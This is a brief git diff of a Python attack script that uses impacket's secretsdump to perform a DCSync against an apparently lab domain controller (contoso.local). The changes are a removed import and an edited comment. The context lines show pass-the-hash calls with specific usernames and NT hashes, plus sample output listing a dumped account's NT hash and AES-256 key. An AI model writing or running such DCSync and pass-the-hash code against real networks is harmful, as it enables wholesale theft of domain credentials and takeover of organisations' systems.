@@ -1,6 +1,6 @@
 from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
 from impacket.smbconnection import SMBConnection
-from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
+from impacket.ldap.ldap import LDAPConnection
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 import io
 from contextlib import redirect_stdout
@@ -103,7 +103,7 @@ def parse_output(ntds_dump):
 dcsync_out = dcsync(target="192.168.56.133", username="d.garza", nthash="5a642013439f0ab8721115d3a87068db", domain="contoso.local") # Can perform DCSync
 #dcsync_out = dcsync(target="192.168.56.133", username="l.douglas", nthash="e3162fc537e66f4dc1287271cdbec59b", domain="contoso.local") # Cannot perform DCSync
 
-# Output is a list of dict in the following format:
+# Output is a list of dict in the following format, None if error:
 # [{'username':'l.douglas', 'rid':'1652', 'nthash':'e3162fc537e66f4dc1287271cdbec59b', 'aes_256':'5db0df75e081189715afe6c7bd14436e6a068365a212244a7f904e1178b8b310'}]
 for entry in dcsync_out:
     print(entry)
